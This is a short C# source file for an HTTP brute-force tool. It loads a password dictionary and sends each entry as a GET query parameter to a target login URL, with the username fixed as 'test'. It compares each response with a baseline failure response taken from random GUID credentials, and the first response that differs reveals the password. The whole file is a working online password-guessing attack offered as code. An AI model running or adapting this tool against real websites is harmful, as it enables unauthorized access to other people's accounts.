using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace bruteForce
{
    class BruteForceHTTP
    {

        public string getUsrename = "";
        public string getPassword = "";
        public string url = "";
        public string dicoPath = "";
        public string username = "";
        public string password = "";

        public BruteForceHTTP(string _url, string _get,  string _get2,string _dicoPath)
        {
            this.url = _url;
            this.getUsrename = _get;
            this.getPassword = _get2;
            this.dicoPath = _dicoPath;

        }

        public string findPassword()
        {
            FileStream fl = File.OpenRead(dicoPath);
            HttpWebResponse reponse;
            String[] allPassword = File.ReadAllLines(dicoPath);
            int nbLine = allPassword.Count();
            string _url;
            WebRequest request;
            String badRequest = "";
            String finalRequest = "";
            StreamReader sr;

            for (int i = -1; i < nbLine; i++)
            {
                if (i == -1)
                {
                    Guid guid = Guid.NewGuid();
                    _url = constructUrl(url, getUsrename,  guid.ToString(), getPassword, guid.ToString());
                    request = WebRequest.Create(_url);
                    reponse = (HttpWebResponse)request.GetResponse();
                    sr = new StreamReader(reponse.GetResponseStream());
                    badRequest = sr.ReadToEnd();
                }
                else
                {
                    _url = constructUrl(url, getUsrename, "test", getPassword, allPassword[i]);
                    request = WebRequest.Create(_url);
                    reponse = (HttpWebResponse)request.GetResponse();
                    sr = new StreamReader(reponse.GetResponseStream());
                    finalRequest = sr.ReadToEnd();
                }

                if (finalRequest != badRequest && i != -1)
                {
                    return allPassword[i];
                }
            }

            return password;

        }


        private string constructUrl(string _url, string _get, string _getText, string _get2, string _get2Text)
        {
            string toReturn;
            if (_url.Contains("?"))
            {
                toReturn = _url + "&" + _get + "=" + _getText + "&" + _get2 + "=" + _get2Text;
            }
            else
            {
                toReturn = _url + "?" + _get + "=" + _getText + "&" + _get2 + "=" + _get2Text;
            }

            return toReturn;
        }
    }
}
